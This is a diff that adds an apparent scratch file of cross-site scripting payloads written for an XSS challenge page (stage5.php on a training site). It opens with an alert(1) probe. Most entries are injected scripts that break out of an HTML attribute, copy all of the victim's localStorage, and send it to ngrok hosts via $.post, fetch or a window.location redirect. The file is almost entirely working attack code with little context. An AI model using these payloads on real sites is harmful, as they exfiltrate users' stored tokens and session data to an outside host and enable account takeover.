@@ -1,0 +1,40 @@
+https://challenges.itsafe.co.il/XSS/stage5.php?_=aaaa'><script>alert(1)</script><span+id%3d'
+
+
+$.post("https://9eb0-84-229-137-50.ngrok.io",dict, function(data){console.log(data)});
+
+var dict = {};
+var keys = Object.keys(localStorage);
+var i = keys.length;
+
+while ( i-- ) {
+	dict[Object.keys(localStorage)[i]]=localStorage.getItem(keys[i])
+  
+}
+
+    console.log(dict);
+
+
+
+PAYLOAD:
+https://challenges.itsafe.co.il/XSS/stage5.php?_=aaaa'><script>var dict = {};var keys = Object.keys(localStorage);var i = keys.length;while ( i-- ) {dict[Object.keys(localStorage)[i]]=localStorage.getItem(keys[i])};$.post("https://a5c5-84-229-137-50.ngrok.io",dict, function(data){console.log(data)});</script><span+id%3d'
+
+aaaa'><script>var dict = {};var keys = Object.keys(localStorage);var i = keys.length;while ( i-- ) {dict[Object.keys(localStorage)[i]]=localStorage.getItem(keys[i])};$.post("https://a5c5-84-229-137-50.ngrok.io",dict, function(data){console.log(data)});</script><span+id%3d'
+
+/XSS/stage5.php?_=aaaa'><script>var dict = {};var keys = Object.keys(localStorage);var i = keys.length;while ( i-- ) {dict[Object.keys(localStorage)[i]]=localStorage.getItem(keys[i])};$.post("https://a5c5-84-229-137-50.ngrok.io",dict, function(data){console.log(data)});</script><span id='
+
+/XSS/stage5.php?_=aaaa'><script>var dict = {};var keys = Object.keys(localStorage);var i = keys.length;while ( i-- ) {dict[Object.keys(localStorage)[i]]=localStorage.getItem(keys[i])};window.location = "https://6932-84-229-137-50.ngrok.io/?payload" + dict</script><span id='
+
+
+/XSS/stage5.php?_=aaaa'><script>var dict = {};var keys = Object.keys(localStorage);var i = keys.length;while ( i-- ) {dict[Object.keys(localStorage)[i]]=localStorage.getItem(keys[i])};
+fetch('https://6932-84-229-137-50.ngrok.io', {method: 'POST',headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: JSON.stringify(dict)});</script><span id='
+
+
+window.location = "https://6932-84-229-137-50.ngrok.io/?" + JSON.stringify(dict)
+
+/XSS/stage5.php?_=aaaa'><script>var dict = {};var keys = Object.keys(localStorage);var i = keys.length;while ( i-- ) {dict[Object.keys(localStorage)[i]]=localStorage.getItem(keys[i])};
+fetch('https://6932-84-229-137-50.ngrok.io', {method: 'POST',headers: {'Content-Type':'application/x-www-form-urlencoded'}, body: JSON.stringify(dict)});</script><span id='
+
+
+/XSS/stage5.php?_=aaaa'><script>var dict = {};var keys = Object.keys(localStorage);var i = keys.length;while ( i-- ) {dict[Object.keys(localStorage)[i]]=localStorage.getItem(keys[i])};window.location = "http://2738-84-229-136-75.ngrok.io?payload" + JSON.stringify(dict)</script><span id='
+
